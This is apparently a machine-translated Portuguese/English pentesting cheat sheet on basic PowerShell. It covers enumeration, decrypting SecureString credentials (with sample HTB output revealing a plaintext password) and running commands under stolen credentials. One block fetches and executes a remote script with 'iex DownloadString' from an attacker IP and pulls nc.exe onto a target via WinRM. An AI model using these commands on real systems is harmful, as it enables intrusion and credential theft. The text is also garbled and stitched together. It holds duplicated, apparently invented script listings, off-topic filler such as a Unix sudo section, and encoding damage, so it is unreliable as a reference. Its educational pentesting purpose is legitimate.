- **disable-ntlmv1.ps1**: This script disables NTLMv1 authentication on the Windows system.

- **disable-ntlmv1.ps1**: Este script desativa a autentica√ß√£o NTLMv1 no sistema Windows.

- **enable-smartscreen.ps1**: This script enables Windows SmartScreen on the Windows system.

- **enable-smartscreen.ps1**: Este script ativa o Windows SmartScreen no sistema Windows.

- **disable-wdigest.ps1**: This script disables WDigest authentication on the Windows system.

- **disable-wdigest.ps1**: Este script desativa a autentica√ß√£o WDigest no sistema Windows.

- **enable-applocker.ps1**: This script enables AppLocker on the Windows system.

- **enable-applocker.ps1**: Este script ativa o AppLocker no sistema Windows.

- **disable-smbv1.ps1**: This script disables SMBv1 on the Windows system.

- **disable-smbv1.ps1**: Este script desativa o SMBv1 no sistema Windows.

- **enable-windows-event-logging.ps1**: This script enables Windows event logging on the Windows system.

- **enable-windows-event-logging.ps1**: Este script ativa o registro de eventos do Windows no sistema Windows.

- **disable-lmhash.ps1**: This script disables LM hash storage on the Windows system.

- **disable-lmhash.ps1**: Este script desativa o armazenamento de hash LM no sistema Windows.

- **enable-windows-firewall-logging.ps1**: This script enables Windows Firewall logging on the Windows system.

- **enable-windows-firewall-logging.ps1**: Este script ativa o registro de firewall do Windows no sistema Windows.

- **disable-netbios.ps1**: This script disables NetBIOS over TCP/IP on the Windows system.

- **disable-netbios.ps1**: Este script desativa o NetBIOS sobre TCP/IP no sistema Windows.

- **enable-windows-smartscreen.ps1**: This script enables Windows SmartScreen on the Windows system.

- **enable-windows-smartscreen.ps1**: Este script ativa o Windows SmartScreen no sistema Windows.

- **disable-ipv6.ps1**: This script disables IPv6 on the Windows system.

- **disable-ipv6.ps1**: Este script desativa o IPv6 no sistema Windows.

- **enable-windows-update-automatic-restart.ps1**: This script enables automatic restart after Windows updates on the Windows system.

- **enable-windows-update-automatic-restart.ps1**: Este script ativa a reinicializa√ß√£o autom√°tica ap√≥s as atualiza√ß√µes do Windows no sistema Windows.

- **disable-weak-protocols.ps1**: This script disables weak protocols on the Windows system.

- **disable-weak-protocols.ps1**: Este script desativa protocolos fracos no sistema Windows.

- **enable-windows-defender-real-time-protection.ps1**: This script enables real-time protection in Windows Defender on the Windows system.

- **enable-windows-defender-real-time-protection.ps1**: Este script ativa a prote√ß√£o em tempo real no Windows Defender no sistema Windows.

- **disable-autoplay.ps1**: This script disables AutoPlay on the Windows system.

- **disable-autoplay.ps1**: Este script desativa o AutoPlay no sistema Windows.

- **enable-windows-update-automatic-download.ps1**: This script enables automatic download of Windows updates on the Windows system.

- **enable-windows-update-automatic-download.ps1**: Este script ativa o download autom√°tico das atualiza√ß√µes do Windows no sistema Windows.

- **disable-weak-ciphers.ps1**: This script disables weak ciphers on the Windows system.

- **disable-weak-ciphers.ps1**: Este script desativa cifras fracas no sistema Windows.

- **enable-windows-defender-cloud-based-protection.ps1**: This script enables cloud-based protection in Windows Defender on the Windows system.

- **enable-windows-defender-cloud-based-protection.ps1**: Este script ativa a prote√ß√£o baseada em nuvem no Windows Defender no sistema Windows.

- **disable-remote-assistance.ps1**: This script disables Remote Assistance on the Windows system.

- **disable-remote-assistance.ps1**: Este script desativa a Assist√™ncia Remota no sistema Windows.

- **enable-windows-update-automatic-install.ps1**: This script enables automatic installation of Windows updates on the Windows system.

- **enable-windows-update-automatic-install.ps1**: Este script ativa a instala√ß√£o autom√°tica das atualiza√ß√µes do Windows no sistema Windows.

- **disable-weak-ciphers.ps1**: This script disables weak ciphers on the Windows system.

- **disable-weak-ciphers.ps1**: Este script desativa cifras fracas no sistema Windows.

- **enable-windows-defender-cloud-based-protection.ps1**: This script enables cloud-based protection in Windows Defender on the Windows system.

- **enable-windows-defender-cloud-based-protection.ps1**: Este script ativa a prote√ß√£o baseada em nuvem no Windows Defender no sistema Windows.

- **disable-remote-assistance.ps1**: This script disables Remote Assistance on the Windows system.

- **disable-remote-assistance.ps1**: Este script desativa a Assist√™ncia Remota no sistema Windows.

- **enable-windows-update-automatic-install.ps1**: This script enables automatic installation of Windows updates on the Windows system.

- **enable-windows-update-automatic-install.ps1**: Este script ativa a instala√ß√£o autom√°tica das atualiza√ß√µes do Windows no sistema Windows.

## Disclaimer

---

## Aviso Legal

This repository is for educational purposes only. The scripts provided here should only be used on systems that you have permission to test. The author is not responsible for any misuse or damage caused by these scripts.

Este reposit√≥rio √© apenas para fins educacionais. Os scripts fornecidos aqui devem ser usados apenas em sistemas nos quais voc√™ tenha permiss√£o para testar. O autor n√£o √© respons√°vel por qualquer uso indevido ou danos causados por esses scripts.
```powershell
Get-ChildItem Env: | ft Key,Value #get all values
$env:UserName @Get UserName value
```
## Outros drives conectados

When conducting a penetration test, it is important to gather as much information as possible about the target system. One useful piece of information is the list of connected drives on a Windows machine. This can help identify potential areas of interest for further exploration.

In PowerShell, you can use the `Get-PSDrive` cmdlet to retrieve a list of all connected drives. This cmdlet provides information about both local and network drives.

To retrieve the list of connected drives, open a PowerShell session and run the following command:

```powershell
Get-PSDrive
```

This will display a table with information about each drive, including the drive letter, drive type, and root directory.

By examining the list of connected drives, you may discover additional storage devices or network shares that could be potential targets for further investigation. This information can be valuable for identifying potential points of entry or areas where sensitive data may be stored.

Remember to always obtain proper authorization before conducting any penetration testing activities.
```powershell
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
### Lixeira

A Lixeira √© uma pasta especial no sistema operacional Windows que armazena arquivos exclu√≠dos. Esses arquivos s√£o mantidos na Lixeira at√© que sejam permanentemente exclu√≠dos ou restaurados pelo usu√°rio. A Lixeira √© uma parte importante do sistema operacional, pois fornece uma camada adicional de seguran√ßa, permitindo que os usu√°rios recuperem acidentalmente arquivos exclu√≠dos.

No entanto, do ponto de vista de um pentester, a Lixeira pode ser uma fonte valiosa de informa√ß√µes. Os arquivos exclu√≠dos podem conter dados confidenciais, como senhas, informa√ß√µes pessoais ou at√© mesmo documentos importantes. Portanto, explorar a Lixeira pode ser uma t√©cnica √∫til durante um teste de penetra√ß√£o.

Existem v√°rias maneiras de explorar a Lixeira usando o PowerShell. O PowerShell √© uma poderosa ferramenta de linha de comando e script que permite aos pentesters automatizar tarefas e executar comandos complexos. Neste diret√≥rio, voc√™ encontrar√° alguns scripts b√°sicos do PowerShell que podem ser usados para explorar a Lixeira durante um teste de penetra√ß√£o.

Os scripts fornecidos neste diret√≥rio incluem:

- `list-deleted-files.ps1`: Este script lista todos os arquivos exclu√≠dos na Lixeira.
- `restore-deleted-files.ps1`: Este script restaura todos os arquivos exclu√≠dos na Lixeira.
- `permanently-delete-files.ps1`: Este script exclui permanentemente todos os arquivos na Lixeira.

Esses scripts podem ser usados como ponto de partida para desenvolver t√©cnicas mais avan√ßadas de explora√ß√£o da Lixeira usando o PowerShell.
```powershell
$shell = New-Object -com shell.application
$rb = $shell.Namespace(10)
$rb.Items()
```
[https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/](https://jdhitsolutions.com/blog/powershell/7024/managing-the-recycle-bin-with-powershell/)

## Reconhecimento de Dom√≠nio

{% content-ref url="powerview.md" %}
[powerview.md](powerview.md)
{% endcontent-ref %}

## Usu√°rios
```powershell
Get-LocalUser | ft Name,Enabled,Description,LastLogon
Get-ChildItem C:\Users -Force | select Name
```
## String Segura para Texto Simples

O PowerShell fornece uma maneira conveniente de converter uma string segura em texto simples. Isso pode ser √∫til durante testes de penetra√ß√£o para obter informa√ß√µes sens√≠veis armazenadas em formato seguro.

Aqui est√° um exemplo de como converter uma string segura em texto simples usando o PowerShell:

```powershell
$secureString = ConvertTo-SecureString -String "MinhaSenhaSegura" -AsPlainText -Force
$plainText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
```

Neste exemplo, a vari√°vel `$secureString` cont√©m a string segura que desejamos converter. Usamos o cmdlet `ConvertTo-SecureString` para criar um objeto de string segura a partir da string fornecida. Em seguida, usamos a fun√ß√£o `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR` para converter o objeto de string segura em um ponteiro BSTR. Finalmente, usamos a fun√ß√£o `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto` para converter o ponteiro BSTR em texto simples.

Ap√≥s a execu√ß√£o dessas etapas, a vari√°vel `$plainText` conter√° o valor da string segura convertida em texto simples.

√â importante lembrar que a convers√£o de uma string segura em texto simples pode expor informa√ß√µes sens√≠veis. Portanto, √© essencial tomar precau√ß√µes adequadas ao lidar com dados confidenciais.
```powershell
$pass = "01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692" | convertto-securestring
$user = "HTB\Tom"
$cred = New-Object System.management.Automation.PSCredential($user, $pass)
$cred.GetNetworkCredential() | fl

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
Ou diretamente analisando a partir de XML:
```powershell
$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *

UserName       : Tom
Password       : 1ts-mag1c!!!
SecurePassword : System.Security.SecureString
Domain         : HTB
```
## SUDO

O comando `sudo` √© uma ferramenta poderosa que permite aos usu√°rios executarem comandos com privil√©gios de superusu√°rio em sistemas baseados em Unix. Isso √© √∫til para realizar tarefas administrativas que exigem permiss√µes elevadas.

### Sintaxe

A sintaxe b√°sica do comando `sudo` √© a seguinte:

```
sudo [op√ß√µes] comando
```

### Exemplos de uso

1. Executar um comando como superusu√°rio:

```
sudo comando
```

2. Executar um comando como outro usu√°rio:

```
sudo -u usu√°rio comando
```

3. Executar um comando com um ambiente de usu√°rio diferente:

```
sudo -i comando
```

### Op√ß√µes comuns

Aqui est√£o algumas op√ß√µes comuns que podem ser usadas com o comando `sudo`:

- `-u usu√°rio`: Executa o comando como o usu√°rio especificado.
- `-i`: Inicia um shell interativo com o ambiente do usu√°rio especificado.
- `-s`: Inicia um shell n√£o interativo com o ambiente do usu√°rio especificado.
- `-l`: Lista os comandos permitidos para o usu√°rio atual.
- `-k`: Invalida o tempo limite de autentica√ß√£o do `sudo`.
- `-v`: Atualiza o tempo limite de autentica√ß√£o do `sudo`.

### Dicas de seguran√ßa

- Evite usar o comando `sudo` desnecessariamente.
- Verifique cuidadosamente os comandos antes de execut√°-los com privil√©gios de superusu√°rio.
- Mantenha o sistema operacional e os pacotes atualizados para evitar vulnerabilidades conhecidas.
- Limite o acesso ao comando `sudo` apenas aos usu√°rios necess√°rios.
- Monitore os logs do `sudo` para detectar atividades suspeitas.

Para obter mais informa√ß√µes sobre o comando `sudo`, consulte o manual do sistema usando o seguinte comando:

```
man sudo
```
```powershell
#CREATE A CREDENTIAL OBJECT
$pass = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<USERNAME>", $pass)

#For local:
Start-Process -Credential ($cred)  -NoNewWindow powershell "iex (New-Object Net.WebClient).DownloadString('http://10.10.14.11:443/ipst.ps1')"

#For WINRM
#CHECK IF CREDENTIALS ARE WORKING EXECUTING whoami (expected: username of the credentials user)
Invoke-Command -Computer ARKHAM -ScriptBlock { whoami } -Credential $cred
#DOWNLOAD nc.exe
Invoke-Command -Computer ARKHAM -ScriptBlock { IWR -uri 10.10.14.17/nc.exe -outfile nc.exe } -credential $cred

Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process C:\xyz\nc.bat -verb Runas}'

#Another method
$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
$computer = "<hostname>"
```
## Grupos

Grupos s√£o uma parte fundamental da administra√ß√£o de sistemas Windows. Eles s√£o usados para organizar e gerenciar usu√°rios e recursos em um ambiente de rede. Neste cap√≠tulo, discutiremos os conceitos b√°sicos de grupos no Windows e como eles podem ser usados em um contexto de pentesting.

### Tipos de Grupos

Existem v√°rios tipos de grupos no Windows, cada um com sua pr√≥pria finalidade e escopo. Os principais tipos de grupos incluem:

- **Grupos Locais**: Esses grupos s√£o criados em um √∫nico computador e s√£o usados para gerenciar o acesso a recursos locais nesse computador. Os grupos locais podem ser usados para conceder permiss√µes a pastas, arquivos e outros recursos no computador local.

- **Grupos Globais**: Esses grupos s√£o criados em um controlador de dom√≠nio e s√£o usados para gerenciar o acesso a recursos em toda a rede. Os grupos globais podem ser usados para conceder permiss√µes a pastas compartilhadas, impressoras e outros recursos em v√°rios computadores.

- **Grupos Universais**: Esses grupos s√£o criados em um controlador de dom√≠nio e podem ser usados para conceder permiss√µes a recursos em toda a floresta do Active Directory. Os grupos universais s√£o √∫teis em ambientes com v√°rias florestas do Active Directory.

### Gerenciamento de Grupos com PowerShell

O PowerShell √© uma ferramenta poderosa para gerenciar grupos no Windows. Ele fornece uma ampla gama de cmdlets (comandos) que podem ser usados para criar, modificar e excluir grupos, bem como para adicionar e remover membros de grupos.

Aqui est√£o alguns exemplos de cmdlets do PowerShell que podem ser usados para gerenciar grupos:

- `New-LocalGroup`: Cria um novo grupo local.
- `Add-LocalGroupMember`: Adiciona um membro a um grupo local.
- `Remove-LocalGroupMember`: Remove um membro de um grupo local.
- `New-ADGroup`: Cria um novo grupo global ou universal no Active Directory.
- `Add-ADGroupMember`: Adiciona um membro a um grupo global ou universal.
- `Remove-ADGroupMember`: Remove um membro de um grupo global ou universal.

Esses cmdlets podem ser combinados com outros cmdlets do PowerShell para realizar tarefas mais avan√ßadas, como a cria√ß√£o de grupos com permiss√µes personalizadas ou a enumera√ß√£o de membros de grupos em toda a rede.

### Explorando Grupos no Pentesting

Durante um teste de penetra√ß√£o, explorar grupos pode ser √∫til para identificar usu√°rios privilegiados, encontrar recursos sens√≠veis e obter acesso n√£o autorizado a sistemas. Os pentesters podem usar t√©cnicas como a enumera√ß√£o de grupos, a busca por grupos com permiss√µes elevadas e a explora√ß√£o de vulnerabilidades relacionadas a grupos para obter acesso e controle adicionais em um ambiente de rede.

No pr√≥ximo cap√≠tulo, discutiremos t√©cnicas avan√ßadas de explora√ß√£o de grupos no Windows e como elas podem ser usadas em um contexto de pentesting.
```powershell
Get-LocalGroup | ft Name #All groups
Get-LocalGroupMember Administrators | ft Name, PrincipalSource #Members of Administrators
```
## √Årea de Transfer√™ncia

A √°rea de transfer√™ncia √© um recurso do sistema operacional que permite copiar e colar informa√ß√µes entre aplicativos. No entanto, esse recurso tamb√©m pode ser explorado por hackers para obter informa√ß√µes confidenciais.

### Roubo de Dados da √Årea de Transfer√™ncia

Os hackers podem usar t√©cnicas para roubar dados da √°rea de transfer√™ncia, como senhas, n√∫meros de cart√£o de cr√©dito e outras informa√ß√µes sens√≠veis. Isso pode ser feito por meio de malware ou scripts maliciosos.

### Protegendo a √Årea de Transfer√™ncia

Para proteger seus dados da √°rea de transfer√™ncia, √© importante seguir algumas pr√°ticas recomendadas:

- Evite copiar informa√ß√µes confidenciais para a √°rea de transfer√™ncia, sempre que poss√≠vel.
- Utilize senhas fortes e evite copi√°-las para a √°rea de transfer√™ncia.
- Mantenha seu sistema operacional e aplicativos atualizados para corrigir poss√≠veis vulnerabilidades.
- Utilize ferramentas de seguran√ßa, como antiv√≠rus e firewalls, para detectar e bloquear malware.
- Esteja atento a poss√≠veis ataques de phishing e evite clicar em links suspeitos ou fornecer informa√ß√µes confidenciais.

Ao seguir essas pr√°ticas, voc√™ pode ajudar a proteger seus dados da √°rea de transfer√™ncia contra poss√≠veis ataques de hackers.
```powershell
Get-Clipboard
```
## Processos

Um processo √© uma inst√¢ncia de um programa em execu√ß√£o em um sistema operacional. No Windows, os processos s√£o gerenciados pelo Gerenciador de Tarefas. Os processos podem ser executados em primeiro plano ou em segundo plano e podem ter privil√©gios diferentes, dependendo das permiss√µes do usu√°rio.

### Listando processos

Para listar todos os processos em execu√ß√£o no sistema, podemos usar o seguinte comando no PowerShell:

```powershell
Get-Process
```

Este comando exibir√° uma lista de todos os processos em execu√ß√£o, incluindo o nome do processo, o ID do processo (PID), o uso de CPU e mem√≥ria, entre outras informa√ß√µes.

### Finalizando processos

Para finalizar um processo espec√≠fico, podemos usar o comando `Stop-Process` seguido pelo PID do processo. Por exemplo, para finalizar o processo com PID 1234, podemos usar o seguinte comando:

```powershell
Stop-Process -Id 1234
```

### Executando comandos em segundo plano

O PowerShell tamb√©m permite executar comandos em segundo plano, o que pode ser √∫til durante um teste de penetra√ß√£o. Para executar um comando em segundo plano, podemos usar o operador `&` seguido pelo comando. Por exemplo, para executar o comando `ping` em segundo plano, podemos usar o seguinte comando:

```powershell
& ping 127.0.0.1 -n 10
```

Isso executar√° o comando `ping` em segundo plano e enviar√° 10 pacotes para o endere√ßo IP 127.0.0.1.

### Conclus√£o

O conhecimento sobre processos √© essencial para um testador de penetra√ß√£o, pois permite listar e finalizar processos no sistema alvo. Al√©m disso, a capacidade de executar comandos em segundo plano pode ser √∫til para realizar tarefas espec√≠ficas durante um teste de penetra√ß√£o.
```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
## Servi√ßos

### Introduction

### Introdu√ß√£o

This section covers basic PowerShell commands that can be used by pentesters to gather information about services running on a Windows system.

Esta se√ß√£o aborda comandos b√°sicos do PowerShell que podem ser usados por pentesters para obter informa√ß√µes sobre os servi√ßos em execu√ß√£o em um sistema Windows.

### Service Management

### Gerenciamento de Servi√ßos

PowerShell provides several cmdlets for managing services on a Windows system. Here are some commonly used cmdlets:

O PowerShell fornece v√°rios cmdlets para gerenciar servi√ßos em um sistema Windows. Aqui est√£o alguns cmdlets comumente usados:

- `Get-Service`: Retrieves the status of services on the local or remote system.
- `Get-Service`: Recupera o status dos servi√ßos no sistema local ou remoto.

- `Start-Service`: Starts one or more services.
- `Start-Service`: Inicia um ou mais servi√ßos.

- `Stop-Service`: Stops one or more services.
- `Stop-Service`: Para um ou mais servi√ßos.

- `Restart-Service`: Restarts one or more services.
- `Restart-Service`: Reinicia um ou mais servi√ßos.

- `Set-Service`: Changes the properties of a service.
- `Set-Service`: Altera as propriedades de um servi√ßo.

### Service Information

### Informa√ß√µes do Servi√ßo

To gather information about services, you can use the `Get-Service` cmdlet. Here are some examples:

Para obter informa√ß√µes sobre os servi√ßos, voc√™ pode usar o cmdlet `Get-Service`. Aqui est√£o alguns exemplos:

- `Get-Service`: Retrieves the status of all services on the local system.
- `Get-Service`: Recupera o status de todos os servi√ßos no sistema local.

- `Get-Service -Name <service_name>`: Retrieves the status of a specific service.
- `Get-Service -Name <nome_do_servi√ßo>`: Recupera o status de um servi√ßo espec√≠fico.

- `Get-Service -DisplayName <display_name>`: Retrieves the status of a service using its display name.
- `Get-Service -DisplayName <nome_de_exibi√ß√£o>`: Recupera o status de um servi√ßo usando seu nome de exibi√ß√£o.

### Service Manipulation

### Manipula√ß√£o de Servi√ßos

PowerShell allows you to start, stop, and restart services using the `Start-Service`, `Stop-Service`, and `Restart-Service` cmdlets, respectively. Here are some examples:

O PowerShell permite iniciar, parar e reiniciar servi√ßos usando os cmdlets `Start-Service`, `Stop-Service` e `Restart-Service`, respectivamente. Aqui est√£o alguns exemplos:

- `Start-Service -Name <service_name>`: Starts a specific service.
- `Start-Service -Name <nome_do_servi√ßo>`: Inicia um servi√ßo espec√≠fico.

- `Stop-Service -Name <service_name>`: Stops a specific service.
- `Stop-Service -Name <nome_do_servi√ßo>`: Para um servi√ßo espec√≠fico.

- `Restart-Service -Name <service_name>`: Restarts a specific service.
- `Restart-Service -Name <nome_do_servi√ßo>`: Reinicia um servi√ßo espec√≠fico.

### Service Configuration

### Configura√ß√£o de Servi√ßos

PowerShell also allows you to change the properties of a service using the `Set-Service` cmdlet. Here are some examples:

O PowerShell tamb√©m permite alterar as propriedades de um servi√ßo usando o cmdlet `Set-Service`. Aqui est√£o alguns exemplos:

- `Set-Service -Name <service_name> -StartupType <startup_type>`: Changes the startup type of a service.
- `Set-Service -Name <nome_do_servi√ßo> -StartupType <tipo_de_inicializa√ß√£o>`: Altera o tipo de inicializa√ß√£o de um servi√ßo.

- `Set-Service -Name <service_name> -Description <description>`: Changes the description of a service.
- `Set-Service -Name <nome_do_servi√ßo> -Description <descri√ß√£o>`: Altera a descri√ß√£o de um servi√ßo.

### Conclusion

### Conclus√£o

Understanding how to manage and gather information about services using PowerShell is essential for pentesters. These basic commands can be used to perform various tasks related to service management on a Windows system.

Compreender como gerenciar e obter informa√ß√µes sobre servi√ßos usando o PowerShell √© essencial para pentesters. Esses comandos b√°sicos podem ser usados para realizar v√°rias tarefas relacionadas ao gerenciamento de servi√ßos em um sistema Windows.
```
Get-Service
```
## Senha a partir de uma string segura

When performing penetration testing on Windows systems, it is common to encounter situations where passwords are stored as secure strings. Secure strings are a way to protect sensitive information, such as passwords, by encrypting them and storing them in memory.

To retrieve the actual password from a secure string, you can use PowerShell. The following script demonstrates how to do this:

```powershell
$secureString = ConvertTo-SecureString -String "MySecurePassword" -AsPlainText -Force
$plainTextPassword = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureString))
Write-Output $plainTextPassword
```

In this script, we first create a secure string using the `ConvertTo-SecureString` cmdlet. We pass the desired password as a plain text string and use the `-AsPlainText` and `-Force` parameters to ensure that the string is treated as plain text and not encrypted.

Next, we use the `[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR` method to convert the secure string to a BSTR (Basic String) representation. Finally, we use the `[System.Runtime.InteropServices.Marshal]::PtrToStringAuto` method to convert the BSTR back to a plain text string.

By running this script, you will be able to retrieve the password from a secure string. However, keep in mind that this technique should only be used for legitimate purposes, such as during penetration testing engagements or when authorized to access the system.
```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```
## Tarefas Agendadas

Scheduled tasks are a powerful feature in Windows that allow you to automate the execution of scripts, commands, or programs at specific times or intervals. As a pentester, understanding how to manipulate and exploit scheduled tasks can be valuable for gaining persistence, privilege escalation, or executing malicious actions on a target system.

As tarefas agendadas s√£o um recurso poderoso no Windows que permite automatizar a execu√ß√£o de scripts, comandos ou programas em hor√°rios ou intervalos espec√≠ficos. Como um pentester, entender como manipular e explorar tarefas agendadas pode ser valioso para obter persist√™ncia, escalonamento de privil√©gios ou executar a√ß√µes maliciosas em um sistema alvo.

### Viewing Scheduled Tasks

To view the list of scheduled tasks on a Windows system, you can use the `Get-ScheduledTask` cmdlet in PowerShell. This cmdlet retrieves information about all the scheduled tasks on the local or remote system.

Para visualizar a lista de tarefas agendadas em um sistema Windows, voc√™ pode usar o cmdlet `Get-ScheduledTask` no PowerShell. Este cmdlet recupera informa√ß√µes sobre todas as tarefas agendadas no sistema local ou remoto.

```powershell
Get-ScheduledTask
```

### Creating Scheduled Tasks

To create a new scheduled task, you can use the `New-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to specify the script, command, or program to be executed, as well as the schedule for the task.

Para criar uma nova tarefa agendada, voc√™ pode usar o cmdlet `New-ScheduledTask` no PowerShell. Este cmdlet permite especificar o script, comando ou programa a ser executado, bem como o agendamento da tarefa.

```powershell
New-ScheduledTask -Action (New-ScheduledTaskAction -Execute "C:\path\to\script.ps1") -Trigger (New-ScheduledTaskTrigger -Daily -At 3am)
```

### Modifying Scheduled Tasks

To modify an existing scheduled task, you can use the `Set-ScheduledTask` cmdlet in PowerShell. This cmdlet allows you to change various properties of the task, such as the script, command, or program to be executed, the schedule, or the user account under which the task runs.

Para modificar uma tarefa agendada existente, voc√™ pode usar o cmdlet `Set-ScheduledTask` no PowerShell. Este cmdlet permite alterar v√°rias propriedades da tarefa, como o script, comando ou programa a ser executado, o agendamento ou a conta de usu√°rio sob a qual a tarefa √© executada.

```powershell
Set-ScheduledTask -TaskPath "\MyTasks" -TaskName "MyTask" -Action (New-ScheduledTaskAction -Execute "C:\path\to\newscript.ps1")
```

### Deleting Scheduled Tasks

To delete a scheduled task, you can use the `Unregister-ScheduledTask` cmdlet in PowerShell. This cmdlet removes the specified task from the system.

Para excluir uma tarefa agendada, voc√™ pode usar o cmdlet `Unregister-ScheduledTask` no PowerShell. Este cmdlet remove a tarefa especificada do sistema.

```powershell
Unregister-ScheduledTask -TaskPath "\MyTasks" -TaskName "MyTask"
```

### Conclusion

Scheduled tasks are a fundamental component of Windows systems and can be leveraged by pentesters for various purposes. By understanding how to view, create, modify, and delete scheduled tasks using PowerShell, you can effectively manipulate and exploit this feature during your engagements.
```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```
### Interfaces

As interfaces de rede s√£o componentes essenciais para a comunica√ß√£o de um sistema com a rede. No Windows, podemos usar o PowerShell para gerenciar e configurar as interfaces de rede.

#### Listar interfaces de rede

Para listar todas as interfaces de rede em um sistema Windows, podemos usar o seguinte comando PowerShell:

```powershell
Get-NetAdapter
```

Este comando exibir√° informa√ß√µes detalhadas sobre todas as interfaces de rede, incluindo o nome, descri√ß√£o, estado, velocidade e endere√ßo MAC.

#### Habilitar ou desabilitar uma interface de rede

Podemos usar o PowerShell para habilitar ou desabilitar uma interface de rede espec√≠fica. Para isso, precisamos conhecer o nome da interface que queremos modificar.

Para desabilitar uma interface de rede, usamos o seguinte comando:

```powershell
Disable-NetAdapter -Name "Nome da Interface"
```

Para habilitar uma interface de rede, usamos o seguinte comando:

```powershell
Enable-NetAdapter -Name "Nome da Interface"
```

Certifique-se de substituir "Nome da Interface" pelo nome correto da interface que deseja habilitar ou desabilitar.

#### Configurar endere√ßo IP

Podemos usar o PowerShell para configurar o endere√ßo IP de uma interface de rede. Para isso, precisamos conhecer o nome da interface que queremos configurar e o endere√ßo IP desejado.

Para configurar o endere√ßo IP de uma interface de rede, usamos o seguinte comando:

```powershell
New-NetIPAddress -InterfaceAlias "Nome da Interface" -IPAddress "Endere√ßo IP" -PrefixLength "Comprimento do Prefixo"
```

Certifique-se de substituir "Nome da Interface" pelo nome correto da interface que deseja configurar, "Endere√ßo IP" pelo endere√ßo IP desejado e "Comprimento do Prefixo" pelo comprimento do prefixo da m√°scara de sub-rede.

#### Configurar servidor DNS

Podemos usar o PowerShell para configurar o servidor DNS de uma interface de rede. Para isso, precisamos conhecer o nome da interface que queremos configurar e o endere√ßo IP do servidor DNS desejado.

Para configurar o servidor DNS de uma interface de rede, usamos o seguinte comando:

```powershell
Set-DnsClientServerAddress -InterfaceAlias "Nome da Interface" -ServerAddresses "Endere√ßo IP do Servidor DNS"
```

Certifique-se de substituir "Nome da Interface" pelo nome correto da interface que deseja configurar e "Endere√ßo IP do Servidor DNS" pelo endere√ßo IP do servidor DNS desejado.

#### Configurar gateway padr√£o

Podemos usar o PowerShell para configurar o gateway padr√£o de uma interface de rede. Para isso, precisamos conhecer o nome da interface que queremos configurar e o endere√ßo IP do gateway desejado.

Para configurar o gateway padr√£o de uma interface de rede, usamos o seguinte comando:

```powershell
Set-NetIPInterface -InterfaceAlias "Nome da Interface" -DefaultGateway "Endere√ßo IP do Gateway"
```

Certifique-se de substituir "Nome da Interface" pelo nome correto da interface que deseja configurar e "Endere√ßo IP do Gateway" pelo endere√ßo IP do gateway desejado.
```powershell
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Firewall

Um firewall √© uma medida de seguran√ßa essencial para proteger um sistema contra amea√ßas externas. Ele atua como uma barreira entre a rede interna e a internet, controlando o tr√°fego de entrada e sa√≠da com base em regras predefinidas.

No Windows, o firewall pode ser configurado usando o PowerShell. O PowerShell √© uma poderosa ferramenta de linha de comando e scripting que permite automatizar tarefas administrativas.

Aqui est√£o alguns comandos b√°sicos do PowerShell para configurar o firewall no Windows:

#### Habilitar o Firewall do Windows:

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

#### Desabilitar o Firewall do Windows:

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
```

#### Permitir uma porta espec√≠fica:

```powershell
New-NetFirewallRule -DisplayName "Allow Port 80" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
```

#### Bloquear uma porta espec√≠fica:

```powershell
New-NetFirewallRule -DisplayName "Block Port 443" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Block
```

Esses comandos b√°sicos podem ser usados como ponto de partida para configurar o firewall do Windows de acordo com as necessidades de seguran√ßa do sistema. √â importante lembrar de ajustar as regras de acordo com os requisitos espec√≠ficos de cada ambiente.
```powershell
Get-NetFirewallRule -Enabled True

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow

# Open SSH to the world
New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow

# Get name, proto, local and rremote ports, remote address, penable,profile and direction
## You can user the following line changing the initial filters to indicat a difefrent direction or action
